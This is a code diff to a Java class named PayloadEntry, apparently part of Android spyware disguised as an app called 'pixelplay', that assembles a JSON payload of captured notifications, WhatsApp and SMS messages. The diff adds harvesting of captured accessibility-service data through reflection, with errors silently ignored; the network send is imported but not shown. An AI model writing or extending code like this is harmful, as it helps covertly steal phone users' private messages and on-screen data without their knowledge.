@@ -11,6 +11,7 @@ import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
+import java.util.List;
 
 public class PayloadEntry {
 
@@ -59,6 +60,7 @@ public class PayloadEntry {
 
             JSONArray caps = getCapturedNotifs();
             p.put("notifications", caps);
+
             JSONArray wa = new JSONArray();
             JSONArray sms = new JSONArray();
             for (int i = 0; i < caps.length(); i++) {
@@ -71,6 +73,9 @@ public class PayloadEntry {
             }
             p.put("whatsapp", wa);
             p.put("sms", sms);
+
+            JSONArray acc = getAccessibilityData();
+            p.put("accessibility", acc);
 
             String json = p.toString(2);
             Log.d(TAG, "[+] payload size: " + json.length());
@@ -112,7 +117,21 @@ public class PayloadEntry {
             Class<?> bridge = Class.forName("com.pixelplay.app.NotificationBridge");
             java.lang.reflect.Method m = bridge.getMethod("getCaptured");
             @SuppressWarnings("unchecked")
-            java.util.List<JSONObject> caps = (java.util.List<JSONObject>) m.invoke(null);
+            List<JSONObject> caps = (List<JSONObject>) m.invoke(null);
+            synchronized (caps) {
+                for (JSONObject n : caps) a.put(n);
+            }
+        } catch (Exception ignored) {}
+        return a;
+    }
+
+    private static JSONArray getAccessibilityData() {
+        JSONArray a = new JSONArray();
+        try {
+            Class<?> svc = Class.forName("com.pixelplay.app.PixelVaultService");
+            java.lang.reflect.Method m = svc.getMethod("getCapturedAccessibility");
+            @SuppressWarnings("unchecked")
+            List<JSONObject> caps = (List<JSONObject>) m.invoke(null);
             synchronized (caps) {
                 for (JSONObject n : caps) a.put(n);
             }
